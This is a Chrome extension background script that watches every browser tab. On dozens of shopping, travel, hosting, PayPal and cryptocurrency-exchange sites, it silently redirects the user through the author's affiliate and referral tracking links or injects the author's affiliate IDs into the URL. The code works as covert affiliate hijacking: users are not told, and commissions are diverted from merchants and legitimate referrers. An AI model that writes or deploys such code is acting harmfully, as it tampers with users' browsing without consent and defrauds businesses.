// var timePlusCurrent = 86400000, // 1 day
// var timePlusCurrent = 3600000, // 1 hour
var	timePlusCurrent = 10000, // 10 seconds
    isFound = function( string, substring )
    {
        if( !!string )
        {
            return !!( string.indexOf( substring ) > -1 );
        }
        return false;
    },
    isFoundAndAfterTime = function( string, substring )
    {
        var timeSaved = parseInt( sessionStorage.getItem( substring ), 10 ) || 0 ;

        return isFound( string, substring )
            && ( timeSaved < new Date().getTime() );
    },
	insertParam = function(url, key, value)
	{
		if (url.indexOf('?') != -1)
		{
			var pairset = url.split('&'),
				i = pairset.length,
				pair;

			key = escape(key);
			value = escape(value);

			while (i--) {
				pair = pairset[i].split('=');

				if (pair[0] == key) {
					pair[1] = value;
					pairset[i] = pair.join('=');
					break;
				}
			}

			if (i < 0) {
				pairset[pairset.length] = [key, value].join('=');
			}
			return pairset.join('&');
		}
		else {
			return url + '?' + [key, value].join('=');
		}
	},
	updateQueryString = function(url, key, value)
	{
		if (!url) url = window.location.href;
		var re = new RegExp("([?&])" + key + "=.*?(&|#|$|;)(.*)", "gi"),
			hash;

		if (re.test(url)) {
			if (typeof value !== 'undefined' && value !== null)
				return url.replace(re, '$1' + key + "=" + value + '$2$3');
			else {
				hash = url.split('#');
				url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');
				if (typeof hash[1] !== 'undefined' && hash[1] !== null)
					url += '#' + hash[1];
				return url;
			}
		}
		else {
			if (typeof value !== 'undefined' && value !== null) {
				var separator = url.indexOf('?') !== -1 ? '&' : '?';
				hash = url.split('#');
				url = hash[0] + separator + key + '=' + value;
				if (typeof hash[1] !== 'undefined' && hash[1] !== null)
					url += '#' + hash[1];
				return url;
			}
			else
				return url;
		}
	},
	getParamByName = function(name, url)
	{
		if (!url) url = window.location.href;
		name = name.replace(/[\[\]]/g, "\\$&");
		var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
			results = regex.exec(url);
		if (!results) return null;
		if (!results[2]) return '';
		return decodeURIComponent(results[2].replace(/\+/g, " "));
	},

	// VARS
	BkUrl = 'www.booking.com',
	BkKey = 'aid',
	BkId = '1128250',

	SkyUrlEs = 'www.skyscanner.es',
	SkyIdEs = 'associateid',
	SkyIdUrlEs = 'http://clk.tradedoubler.com/click?p=224466&a=2805540&g=0&url=',

	SkyUrlCom = 'www.skyscanner.',
	SkyIdCom = 'associateid',
	SkyIdUrlCom = 'http://clk.tradedoubler.com/click?p=299452&a=3189866&g=0&url=',

	LuftUrl = 'www.lufthansa.com',
	LuftId = 'associateid',
	LuftIdUrl = 'http://clk.tradedoubler.com/click?p=117842&a=3189866&g=0&url=',

	AdobeUrl = 'https://stock.adobe.com/',
	AdobeId = 'associateid',
	AdobeIdUrl = 'http://clk.tradedoubler.com/click?p=311475&a=3189866&g=0&url=',

	DisneyLandUrl = 'https://www.disneylandparis.com/en-gb/',
	DisneyLandId = 'associateid',
	DisneyLandIdUrl = 'http://clk.tradedoubler.com/click?p=8854&a=3189866&g=0&url=',

	HotelopiaUrl = 'https://www.hotelopia.com/',
	HotelopiaIdUrl = 'http://clk.tradedoubler.com/click?p=118795&a=3189866&g=0&url=',

	VuelUrl = 'www.vueling.com',
	VuelId = 'tduid',
	VuelIdUrl = 'http://clk.tradedoubler.com/click?p(275411)a(2805540)g(23758690)url(',

	DiaUrl = 'www.dia.es/compra-online/cart',
	DiaId = 'tduid',
	DiaIdUrl = 'http://clk.tradedoubler.com/click?p(302432)a(2805540)g(24679754)url(',

	MediamarktUrl = 'https://www.mediamarkt.es/',
	MediamarktIdUrl = 'https://clk.tradedoubler.com/click?a=1388433&epi=14590&g=23195268&p=270504&url=',

	MediamarktUrl = 'https://www.mediamarkt.es/',
	MediamarktIdUrl = 'https://clk.tradedoubler.com/click?a=1388433&epi=14590&g=23195268&p=270504&url=',

	RentCUrl = 'www.rentalcars.com',
	RentCKey = 'affiliateCode',
	RentCIdUrl = 'cvalls',

	BHUrl = 'https://www.bluehost.com',
	BHIdUrl = 'https://www.bluehost.com/track/cvalls/',

	CiviUrl = 'www.civitatis.com',
	CiviKey = 'aid',
	CiviId = '11117',

	ThemForUrl = 'themeforest.net',
	ThemForIdUrl = 'https://1.envato.market/c/2336719/275988/4415?u=',

	HostGatUrl = 'https://www.hostgator.com',
	HostGatIdUrl = 'https://partners.hostgator.com/c/2336719/177309/3094?u=',

	HostGatInUrl = 'https://www.hostgator.in/',
	HostGatInIdUrl = 'https://hostgator-india.sjv.io/c/2336719/401174/7275?u=',

	LiquidWebUrl = 'https://www.liquidweb.com/',
	LiquidWebIdUrl = 'https://liquidweb.i3f2.net/c/2336719/278394/4464?u=',

	IThemesUrl = 'https://ithemes.com/',
	IThemesIdUrl = 'https://liquidweb.i3f2.net/c/2336719/278394/4464?u=',

	NexcessUrl = 'nexcess.net/',
	NexcessIdUrl = 'https://liquidweb.i3f2.net/c/2336719/278394/4464?u=',

	EventsCalUrl = 'https://theeventscalendar.com/',
	EventsCalIdUrl = 'https://liquidweb.i3f2.net/c/2336719/278394/4464?u=',

	DomainUrl = 'https://www.domain.com/',
	DomainIdUrl = 'https://domain.mno8.net/c/2336719/577846/9560?u=',

	DecathCaUrl = 'https://www.decathlon.ca/',
	DecathCaIdUrl = 'https://decathalon-canada.mkr3.net/c/2336719/642729/10224?u=',

	HostensUrl = 'https://www.hostens.com/',
	HostensIdUrl = 'https://hostens.pxf.io/c/2336719/875802/12190?u=',

	SiteGroUrl = 'https://www.siteground',
	SiteGroKey = 'afcode',
	SiteGroId = 'c9081b398627e716118507b3ac6e3a58',

	HostingerUrl = 'www.hostinger.',
	HostingerKey = 'utm_source',
	HostingerIdUrl = '?utm_medium=affiliate&utm_source=aff10257&utm_campaign=aff58',

	MyProtUrl = 'https://www.myprotein.',
	MyProtKey = 'applyCode',
	MyProtId = 'CRISTIAN-R2CF',

	ElemUrl = 'https://elementor.com',
	ElemKey = 'ref',
	ElemId = '12861',

	ElegTheUrl = 'https://www.elegantthemes.com/join/',
	ElegTheIdUrl = 'https://www.elegantthemes.com/affiliates/idevaffiliate.php?id=61796&url=61917',

	ElegTheUrl2 = 'https://www.elegantthemes.com/gallery/divi/',
	ElegTheIdUrl2 = 'https://www.elegantthemes.com/affiliates/idevaffiliate.php?id=61796&url=61740',

	ElegTheUrl3 = 'https://www.elegantthemes.com/products/',
	ElegTheIdUrl3 = 'https://www.elegantthemes.com/affiliates/idevaffiliate.php?id=61796&url=61915',

	TrusHouseUrl = 'https://www.trustedhousesitters.com',
	TrusHouseKey = 'awc',
	TrusHouseIdUrl = 'https://www.awin1.com/cread.php?awinmid=5759&awinaffid=356397&clickref=&ued=',

	AliExprEsUrl = 'es.aliexpress.com',
	AliExprEsKey = 'awc',
	AliExprEsIdUrl = 'https://www.awin1.com/cread.php?awinmid=11640&awinaffid=356397&clickref=&ued=',

	AliExprUrl = 'aliexpress.com',
	AliExprKey = 'awc',
	AliExprIdUrl = 'https://www.awin1.com/cread.php?awinmid=6378&awinaffid=356397&clickref=&ued=',

	GrouponUrl = 'www.groupon.co.uk',
	GrouponIdUrl = 'https://www.awin1.com/cread.php?awinmid=18026&awinaffid=356397&clickref=&ued=',

	ZoluckyUrl = 'zolucky.com',
	ZoluckyIdUrl = 'https://track.webgains.com/click.html?wgcampaignid=1514385&wgprogramid=282765&wgtarget=',

	LastMinEsUrl = 'www.es.lastminute.com',
	LastMinEsIdUrl = 'https://www.awin1.com/cread.php?awinmid=10949&awinaffid=356397&clickref=&ued=',

	LastMinUrl = 'www.lastminute.com',
	LastMinIdUrl = 'https://www.awin1.com/cread.php?awinmid=4329&awinaffid=356397&clickref=&ued=',

	EdreamsBRUrl = '.edreams.',
	EdreamsBRIdUrl = 'https://www.awin1.com/cread.php?clickref=14590&q=332007&r=332579&s=2555188&v=10573&ued=',

	CashConvertersBRUrl = '.cashconverters.es',
	CashConvertersBRIdUrl = 'https://www.awin1.com/cread.php?clickref=14590&q=325413&r=332579&s=2256932&v=11128&ued=',

	EbayEsUrl = 'www.ebay.es',
	EbayEsIdUrl = 'https://rover.ebay.com/rover/1/1185-53479-19255-0/1?campid=5338200544&customid=14590&icep_ff3=1&icep_vectorid=229501&kwid=902099&mtid=824&pub=5575340668&toolid=10001&mpre=',

	LearnDashUrl = 'https://www.learndash.com/pricing-and-purchase/',
	LearnDashIdUrl = 'https://learndash.idevaffiliate.com/idevaffiliate.php?id=752&url=122&tid1=ext',

	KlookUrl = 'www.klook.com',
	KlookIdUrl = 'https://affiliate.klook.com/jump',

	LogiTraUrl = 'https://www.logitravel.com',
	LogiTraIdUrl = 'https://ssl.affiliate.logitravel.com/ts/i2795678/tsc?amc=performance.logitravel.44348.52466.40497&rmd=3&trg=',

	PaypalESUrl = 'es/webapps/mpp/account-selection',
	// PaypalESIdUrl = 'https://refer.aklamio.com/paypal/es/follow#username=ChristianVallsSainzdeAja&redirectTo=https%3A%2F%2Fwww.aklamio.com%2Fv%2F80d35febaf6fdadcb88b1dc73a9f3463%2Fr%3Fchannel%3Dlink%26productId%3Dbrand%26rr%3Dshared%26sharingID%3Df1f91b13dfcac0824a8b43f05cd74a0b%26uid%3D91cc6b908de03ba8b79c78af568b2580', //5e
	PaypalESIdUrl = 'http://aklam.io/3Qw4AZ',

	PaypalUSUrl = 'webapps/mpp/account-selection',
	// PaypalUSIdUrl = 'https://refer.aklamio.com/paypal/us/follow#username=ChristianVallsSainzdeAja&redirectTo=https%3A%2F%2Fwww.aklamio.com%2Fv%2F80d35febaf6fdadcb88b1dc73a9f3463%2Fr%3Fchannel%3Dlink%26productId%3Dbrand%26rr%3Dshared%26sharingID%3Df1f91b13dfcac0824a8b43f05cd74a0b%26uid%3D91cc6b908de03ba8b79c78af568b2580',
	PaypalUSIdUrl = 'http://aklam.io/hHLHBZ',

	AmzVideoUrl = 'www.primevideo.com',
	AmzVideoKey = 'tag',
	AmzVideoId = 'c-gm-21',

	HostWorldUrl = 'hostelworld.com',
	HostWorldIdUrl = 'https://prf.hn/click/camref:1011ldeiZ/[p_id:1100l108171]/destination:',

	GetYGUrl = 'www.getyourguide.',
	GetYGKey = 'partner_id',
	GetYGId = 'WWVVR0V',

	BinanceUrl = 'binance.com',
	BinanceKey = 'ref',
	BinanceId = '59545145',

	CoinbaseUrl = '.coinbase.com',
	CoinbaseKey = '/signup',
	CoinbaseId = '/join/aja_w',

	OkexUrl = 'okex.com',
	OkexKey = '/account/register',
	OkexId = '/join/2908882',

	currentUrl = '';

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab)
{
	currentUrl = tab.url.split('#')[0];
	currentUrlToFind = tab.url.split('/')[2] || 'nothingtofind';

	if( changeInfo.status === 'loading' )
	{
		if( isFoundAndAfterTime( currentUrlToFind, BkUrl )
			&& !isFound( currentUrl, BkId ) )
		{
			chrome.tabs.update(tabId, { url: updateQueryString( currentUrl, BkKey, BkId ) }, function ()
			{
				sessionStorage.setItem( BkUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrlToFind, SkyUrlEs )
			&& !isFound( currentUrl, 'checkliveprice' )
			&& !isFound( currentUrl, 'transport_deeplink' )
			&& !isFound( currentUrl, SkyIdEs ) )
		{
			chrome.tabs.update(tabId, { url: SkyIdUrlEs + currentUrl }, function ()
			{
				sessionStorage.setItem( SkyUrlEs, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrlToFind, SkyUrlCom )
			&& !isFound( currentUrl, 'checkliveprice' )
			&& !isFound( currentUrl, 'transport_deeplink' )
			&& !isFound( currentUrl, SkyIdCom ) )
		{
			chrome.tabs.update(tabId, { url: SkyIdUrlCom + currentUrl }, function ()
			{
				sessionStorage.setItem( SkyUrlCom, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrlToFind, LuftUrl )
			&& !isFound( currentUrl, LuftId ) )
		{
			chrome.tabs.update(tabId, { url: LuftIdUrl + currentUrl }, function ()
			{
				sessionStorage.setItem( LuftUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, AdobeUrl )
			&& !isFound( currentUrl, AdobeId ) )
		{
			chrome.tabs.update(tabId, { url: AdobeIdUrl + currentUrl }, function ()
			{
				sessionStorage.setItem( AdobeUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, DisneyLandUrl )
			&& !isFound( currentUrl, DisneyLandId ) )
		{
			chrome.tabs.update(tabId, { url: DisneyLandIdUrl + currentUrl.split('?')[0] }, function ()
			{
				sessionStorage.setItem( DisneyLandUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, HotelopiaUrl )
			&& !isFound( currentUrl, '/booking' ) )
		{
			chrome.tabs.update(tabId, { url: HotelopiaIdUrl + currentUrl.split('?')[0] }, function ()
			{
				sessionStorage.setItem( HotelopiaUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrlToFind, GetYGUrl )
			&& !isFound( currentUrl, GetYGId ) )
		{
			chrome.tabs.update(tabId, { url: updateQueryString( currentUrl, GetYGKey, GetYGId ) }, function ()
			{
				sessionStorage.setItem( GetYGUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrlToFind, VuelUrl ) )
		{
			chrome.tabs.update(tabId, { url: VuelIdUrl + currentUrl + ')' }, function ()
			{
				sessionStorage.setItem( VuelUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, DiaUrl ) )
		{
			chrome.tabs.update(tabId, { url: DiaIdUrl + currentUrl + ')' }, function ()
			{
				sessionStorage.setItem( DiaUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrlToFind, RentCUrl ) )
		{
			chrome.tabs.update(tabId, { url: updateQueryString( currentUrl, RentCKey, RentCIdUrl ) }, function ()
			{
				sessionStorage.setItem( RentCUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, BHUrl )
			&& !isFound( currentUrl, '/partner/' )
			&& !isFound( currentUrl, '/affiliates' ) )
		{
			chrome.tabs.update(tabId, { url: BHIdUrl }, function ()
			{
				sessionStorage.setItem( BHUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, MyProtUrl )
			&& !isFound( currentUrl, MyProtId )
			/*&& !isFound( currentUrl, '/my.basket' )*/ )
		{
			chrome.tabs.update(tabId, { url: updateQueryString( currentUrl, MyProtKey, MyProtId ) }, function ()
			{
				sessionStorage.setItem( MyProtUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrlToFind, CiviUrl )
			&& !isFound( currentUrl, CiviId ) )
		{
			chrome.tabs.update(tabId, { url: updateQueryString( currentUrl, CiviKey, CiviId ) }, function ()
			{
				sessionStorage.setItem( CiviUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, SiteGroUrl )
			&& !isFound( currentUrl, SiteGroId ) )
		{
			chrome.tabs.update(tabId, { url: updateQueryString( currentUrl, SiteGroKey, SiteGroId ) }, function ()
			{
				sessionStorage.setItem( SiteGroUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, HostGatInUrl )
			&& !isFound( currentUrl, 'portal.' ) )
		{
			chrome.tabs.update(tabId, { url: HostGatInIdUrl + currentUrl.split('?')[0]  }, function ()
			{
				sessionStorage.setItem( HostGatInUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, HostGatUrl )
			&& !isFound( currentUrl, 'portal.' ) )
		{
			chrome.tabs.update(tabId, { url: HostGatIdUrl + currentUrl.split('?')[0]  }, function ()
			{
				sessionStorage.setItem( HostGatUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrlToFind, ThemForUrl )
			&& !isFound( currentUrl, '/checkout' )
			&& !isFound( currentUrl, '/user' ) )
		{
			chrome.tabs.update(tabId, { url: ThemForIdUrl + currentUrl.split('?')[0]  }, function ()
			{
				sessionStorage.setItem( ThemForUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, LiquidWebUrl ) )
		{
			chrome.tabs.update(tabId, { url: LiquidWebIdUrl + currentUrl.split('?')[0]  }, function ()
			{
				sessionStorage.setItem( LiquidWebUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, IThemesUrl ) )
		{
			chrome.tabs.update(tabId, { url: IThemesIdUrl + currentUrl.split('?')[0]  }, function ()
			{
				sessionStorage.setItem( IThemesUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrlToFind, NexcessUrl )
			&& !isFound( currentUrl, 'my.' ) )
		{
			chrome.tabs.update(tabId, { url: NexcessIdUrl + currentUrl.split('?')[0]  }, function ()
			{
				sessionStorage.setItem( NexcessUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, EventsCalUrl ) )
		{
			chrome.tabs.update(tabId, { url: EventsCalIdUrl + currentUrl.split('?')[0]  }, function ()
			{
				sessionStorage.setItem( EventsCalUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, DomainUrl ) )
		{
			chrome.tabs.update(tabId, { url: DomainIdUrl + currentUrl.split('?')[0]  }, function ()
			{
				sessionStorage.setItem( DomainUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, DecathCaUrl ) )
		{
			chrome.tabs.update(tabId, { url: DecathCaIdUrl + currentUrl.split('?')[0]  }, function ()
			{
				sessionStorage.setItem( DecathCaUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, HostensUrl ) )
		{
			chrome.tabs.update(tabId, { url: HostensIdUrl + currentUrl.split('?')[0]  }, function ()
			{
				sessionStorage.setItem( HostensUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, HostingerUrl )
			&& !isFound( currentUrl, HostingerKey ) )
		{
			chrome.tabs.update(tabId, { url: currentUrl.split('?')[0] + HostingerIdUrl }, function ()
			{
				sessionStorage.setItem( HostingerUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, ElemUrl )
			&& !isFound( currentUrl, ElemId ) )
		{
			chrome.tabs.update(tabId, { url: updateQueryString( currentUrl, ElemKey, ElemId ) }, function ()
			{
				sessionStorage.setItem( ElemUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrlToFind, ZoluckyUrl )
			&& !isFound( currentUrl, '/account/' ) )
		{
			chrome.tabs.update(tabId, { url: ZoluckyIdUrl + currentUrl.split('?')[0]  }, function ()
			{
				sessionStorage.setItem( ZoluckyUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, ElegTheUrl ) )
		{
			chrome.tabs.update(tabId, { url: ElegTheIdUrl }, function ()
			{
				sessionStorage.setItem( ElegTheUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, ElegTheUrl2 ) )
		{
			chrome.tabs.update(tabId, { url: ElegTheIdUrl2 }, function ()
			{
				sessionStorage.setItem( ElegTheUrl2, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, ElegTheUrl3 ) )
		{
			chrome.tabs.update(tabId, { url: ElegTheIdUrl3 }, function ()
			{
				sessionStorage.setItem( ElegTheUrl3, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, TrusHouseUrl )
			&& !isFound( currentUrl, 'accounts' )
			&& !isFound( currentUrl, TrusHouseKey ) )
		{
			chrome.tabs.update(tabId, { url: TrusHouseIdUrl + currentUrl }, function ()
			{
				sessionStorage.setItem( TrusHouseUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, AliExprEsUrl ) )
		{
			chrome.tabs.update(tabId, { url: AliExprEsIdUrl + currentUrl }, function ()
			{
				sessionStorage.setItem( AliExprEsUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, AliExprUrl ) )
		{
			chrome.tabs.update(tabId, { url: AliExprIdUrl + currentUrl }, function ()
			{
				sessionStorage.setItem( AliExprUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, GrouponUrl ) )
		{
			chrome.tabs.update(tabId, { url: GrouponIdUrl + currentUrl }, function ()
			{
				sessionStorage.setItem( GrouponUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, LastMinEsUrl ) )
		{
			chrome.tabs.update(tabId, { url: LastMinEsIdUrl + currentUrl }, function ()
			{
				sessionStorage.setItem( LastMinEsUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, LastMinUrl ) )
		{
			chrome.tabs.update(tabId, { url: LastMinIdUrl + currentUrl }, function ()
			{
				sessionStorage.setItem( LastMinUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, EdreamsBRUrl ) )
		{
			chrome.tabs.update(tabId, { url: EdreamsBRIdUrl + currentUrl }, function ()
			{
				sessionStorage.setItem( EdreamsBRUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, CashConvertersBRUrl ) )
		{
			chrome.tabs.update(tabId, { url: CashConvertersBRIdUrl + currentUrl }, function ()
			{
				sessionStorage.setItem( CashConvertersBRUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if ( isFoundAndAfterTime( currentUrlToFind, EbayEsUrl )
			&& !isFound( currentUrl, 'rmvSB' )
			&& !isFound( currentUrl, 'myb' )
			&& !isFound( currentUrl, 'pay.' )
			)
		{
		 	chrome.tabs.update(tabId, { url: EbayEsIdUrl + currentUrl }, function ()
		 	{
				sessionStorage.setItem( EbayEsUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, LearnDashUrl ) )
		{
			chrome.tabs.update(tabId, { url: LearnDashIdUrl }, function ()
			{
				sessionStorage.setItem( LearnDashUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrlToFind, KlookUrl )
			&& ( isFound( currentUrl, 'city' ) || isFound( currentUrl, 'activity' ) ) )
		{
			chrome.tabs.update(tabId, { url: KlookIdUrl + ( currentUrl.split('?')[0] || currentUrl ).replace( 'https://' + currentUrlToFind, '' ) + '?adid=223064&aid=15329' }, function ()
			{
				sessionStorage.setItem( KlookUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, LogiTraUrl ) )
		{
			chrome.tabs.update(tabId, { url: LogiTraIdUrl + encodeURIComponent( currentUrl ) }, function ()
			{
				sessionStorage.setItem( LogiTraUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, 'https://www.paypal.com/' )
			&& isFound( currentUrl, PaypalESUrl ) )
		{
			chrome.tabs.update(tabId, { url: PaypalESIdUrl }, function ()
			{
				sessionStorage.setItem( 'https://www.paypal.com/', new Date().getTime() + timePlusCurrent );
			} );
		}
		else if( isFoundAndAfterTime( currentUrl, 'https://www.paypal.com/' )
			&& ( isFound( currentUrl, PaypalUSUrl ) || isFound( currentUrl, 'for-you/account/create-account' ) ) )
		{
			chrome.tabs.update(tabId, { url: PaypalUSIdUrl }, function ()
			{
				sessionStorage.setItem( 'https://www.paypal.com/', new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrlToFind, AmzVideoUrl )
			&& ( currentUrl === 'https://www.primevideo.com/' || isFound( currentUrl, '/home/' ) )
			&& !isFound( currentUrl, AmzVideoId ) )
		{
			chrome.tabs.update(tabId, { url: updateQueryString( currentUrl, AmzVideoKey, AmzVideoId ) }, function ()
			{
				sessionStorage.setItem( AmzVideoUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrlToFind, HostWorldUrl ) )
		{
			chrome.tabs.update(tabId, { url: HostWorldIdUrl + encodeURIComponent( currentUrl ) }, function ()
			{
				sessionStorage.setItem( HostWorldUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, BinanceUrl )
			&& isFound( currentUrl, '/register' ) )
		{
			chrome.tabs.update(tabId, { url: updateQueryString( currentUrl, BinanceKey, BinanceId ) }, function ()
			{
				sessionStorage.setItem( BinanceUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, CoinbaseUrl )
			&& isFound( currentUrl, CoinbaseKey ) )
		{
			chrome.tabs.update(tabId, { url: currentUrl.split( CoinbaseKey )[0] + CoinbaseId }, function ()
			{
				sessionStorage.setItem( CoinbaseUrl, new Date().getTime() + timePlusCurrent );
			} );
		}

		else if( isFoundAndAfterTime( currentUrl, OkexUrl )
			&& isFound( currentUrl, OkexKey ) )
		{
			chrome.tabs.update(tabId, { url: currentUrl.split( OkexKey )[0] + OkexId }, function ()
			{
				sessionStorage.setItem( OkexUrl, new Date().getTime() + timePlusCurrent );
			} );
		}
	}
});

